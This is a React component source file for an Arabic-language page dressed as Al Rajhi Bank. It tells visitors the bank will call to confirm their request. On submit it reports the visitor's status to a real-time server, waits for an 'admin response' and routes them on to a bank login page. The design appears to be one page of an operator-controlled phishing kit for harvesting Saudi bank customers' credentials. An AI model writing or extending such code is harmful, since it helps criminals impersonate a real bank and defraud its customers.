import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";
import Stack from "@mui/material/Stack";
import { useEffect } from "react";
import AlRajhiButton from "@/components/AlRajhiButton";
import Main from "@/components/Main";

function sendData() {
  sendDataToServer({
    data: { الحالة: "تم تلقي المكالة" },
    current: "إتصال الراجحى",
    nextPage: "تسجيل الدخول الراجحى",
    waitingForAdminResponse: true,
  });
}

function AlRajhiContact() {
  useEffect(() => setCurrentPage("إتصال الراجحى"), []);
  return (
    <Main variant="al-rajhi">
      <form
        className="relative flex flex-col flex-1 gap-8 w-full justify-between sm:justify-center rounded-xl"
        style={{ height: "calc(100dvh - 1.5rem - 39.6px - 3rem)" }}
      >
        <div>
          <div className="bg-[#f5f6fa] h-[35dvh] grid place-items-center">
            <img src="images/contact.png" alt="contact" className="h-28" />
          </div>
          <p className="text-center px-10 text-sm md:text-base font-bold mt-4">
            سيتم الإتصال بك من قبل مصرف الراجحى لتأكيد طلبك
          </p>
        </div>

        <Stack
          className="flex justify-end sm:justify-center w-full"
          sx={{ flexDirection: "row" }}
        >
          <AlRajhiButton
            variant="contained"
            className="sm:w-10 w-full"
            type="submit"
            onClick={sendData}
          >
            متابعة
          </AlRajhiButton>
        </Stack>
      </form>
    </Main>
  );
}

export default AlRajhiContact;
